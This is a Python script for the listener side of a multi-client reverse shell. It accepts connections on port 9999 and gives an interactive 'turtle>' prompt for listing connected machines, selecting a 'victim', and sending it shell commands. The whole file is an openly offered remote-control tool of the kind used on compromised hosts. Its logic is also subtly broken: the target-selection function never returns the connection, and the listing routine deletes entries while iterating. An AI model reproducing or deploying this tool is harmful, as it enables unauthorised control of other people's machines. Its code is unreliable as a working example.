import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]

queue = Queue()
all_connections = []
all_address = []

# create a socket ( connect to computers )
def create_socket():
    try:
        global host
        global port
        global s

        host = ""
        port = 9999

        s = socket.socket()
    
    except socket.error as msg:
        print("socket creation error: " + str(msg))

# binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port "+str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" +str(msg)+"Retrying...")
        bind_socket()

# Handling connection from multiple clients and saving to a list

# Closing previous connections when server.py file is restarted

def accepting_connection():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1) # prevents timeout

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established : "+address[0])
        except:
            print("Error accepting connections")

# 2nd Thread functions -1) see all the clients 2) Select a client 3) Send commands to the connnected client

# Interactive prompt for sending commands

def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()

        elif "select" in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        
        else:
            print("command not recongnized")

# Display all current active connections with the client

def list_connections():
    result = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i) + "   " + str(all_address[i][0]) + "  " + str(all_address[i][1]) + "\n"

        print("-------- clients ------"+ "\n"+ results)

# selecting the target
def get_target(cmd):
    try:
        target = cmd.replace("select ","")  # target = id
        target = int(target)
        conn = all_connections[target]
        print("You care now connected to: " + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")

    except:
        print("Selection not valid")
        return None
    
# send commands to client/victim
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                conn.close()
                s.close()
                sys.exit()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(1024), 'utf-8')
                print(client_response, end="")
        except:
            print("Error sending commands")
            break

# create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

# do next job that is int the queue (Handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connection()
        if x == 2:
            start_turtle()

        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()

create_workers()
create_jobs()